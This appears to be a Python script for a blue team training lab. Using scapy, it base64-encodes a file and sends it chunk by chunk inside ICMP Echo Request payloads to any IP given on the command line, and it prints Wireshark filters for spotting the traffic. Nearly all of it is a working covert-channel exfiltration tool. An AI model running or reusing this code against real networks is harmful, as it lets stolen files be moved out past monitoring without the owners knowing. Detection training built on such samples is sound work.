#!/usr/bin/env python3
"""
ICMP Tunnel Sender — Blue Team Training Lab
===========================================
Reads a file, base64-encodes it, and exfiltrates it chunk-by-chunk
inside ICMP Echo Request payloads — simulating a covert data exfiltration.
Requires root / sudo privileges (raw socket access).

Usage:
    sudo python3 sender.py
    sudo python3 sender.py 127.0.0.1 secret.txt
"""

import os
import sys
import time
import uuid
import base64
from scapy.all import IP, ICMP, Raw, send

# ── Config ────────────────────────────────────────────────────────────────────
MAGIC_HDR  = "ICMTUN"    # Must match receiver
MAGIC_ID   = 0x4C42      # Must match receiver (Wireshark: icmp[4:2] == 0x4c42)
CHUNK_SIZE = 32           # Bytes per chunk — small = more packets = easier demo
INTER_PKT  = 0.15         # Delay between packets (seconds)
TTL        = 64           # IP TTL
# ─────────────────────────────────────────────────────────────────────────────


def banner():
    print("""
╔══════════════════════════════════════════════════╗
║     ICMP Tunnel Sender — Blue Team Lab           ║
║     Simulating covert data exfiltration via ICMP ║
╚══════════════════════════════════════════════════╝
""")


def exfiltrate(target_ip: str, filepath: str) -> None:
    if not os.path.isfile(filepath):
        sys.exit(f"[-] File not found: {filepath}")

    filename = os.path.basename(filepath)
    data     = open(filepath, "rb").read()
    encoded  = base64.b64encode(data).decode("ascii")
    chunks   = [encoded[i:i + CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    total    = len(chunks)
    session  = uuid.uuid4().hex[:8]   # Short random session identifier

    print(f"[*] Target IP   : {target_ip}")
    print(f"[*] File        : {filename}  ({len(data)} bytes)")
    print(f"[*] Session ID  : {session}")
    print(f"[*] ICMP ID     : 0x{MAGIC_ID:04X}  (tagged identifier)")
    print(f"[*] Chunks      : {total}  (chunk size: {CHUNK_SIZE} bytes)")
    print(f"[*] Payload fmt : ICMTUN:<session>:<seq>:<total>:<file>:<b64_chunk>")
    print()

    for i, chunk in enumerate(chunks):
        # ── Wire format ──────────────────────────────────────────────────────
        # ICMTUN:<session_id>:<seq_index>:<total_chunks>:<filename>:<b64_chunk>
        payload = f"{MAGIC_HDR}:{session}:{i}:{total}:{filename}:{chunk}"

        pkt = (
            IP(dst=target_ip, ttl=TTL)
            / ICMP(type=8, id=MAGIC_ID, seq=i)     # type=8 → Echo Request
            / Raw(load=payload.encode())
        )
        send(pkt, verbose=0)

        done = i + 1
        bar  = "█" * int(done / total * 30)
        sys.stdout.write(f"\r[*] Sending  : [{bar:<30}] {done}/{total} pkts  |  seq={i}  chunk_len={len(chunk)}")
        sys.stdout.flush()
        time.sleep(INTER_PKT)

    print(f"\n")
    print(f"[+] Exfiltration complete!")
    print(f"[+] Sent {len(data)} bytes across {total} ICMP Echo Requests")
    print()
    print("[+] Wireshark filters to analyze captured traffic:")
    print(f"    Show tunnel packets  : icmp[4:2] == 0x{MAGIC_ID:04x}")
    print(f"    Only Echo Requests  : icmp.type == 8 and ip.dst == {target_ip}")
    print(f"    Payload keyword     : frame contains \"ICMTUN\"")


def main() -> None:
    # Root check (Linux/macOS)
    if os.name != "nt" and os.geteuid() != 0:
        sys.exit("[-] Raw socket access requires root:\n    sudo python3 sender.py")

    banner()

    # Accept CLI args or prompt interactively
    if len(sys.argv) == 3:
        target_ip = sys.argv[1]
        filepath  = sys.argv[2]
    else:
        target_ip = input("[?] Target IP   [default: 127.0.0.1] : ").strip() or "127.0.0.1"
        filepath  = input("[?] File to exfiltrate [default: secret.txt] : ").strip() or "secret.txt"
        print()

    exfiltrate(target_ip, filepath)


if __name__ == "__main__":
    main()
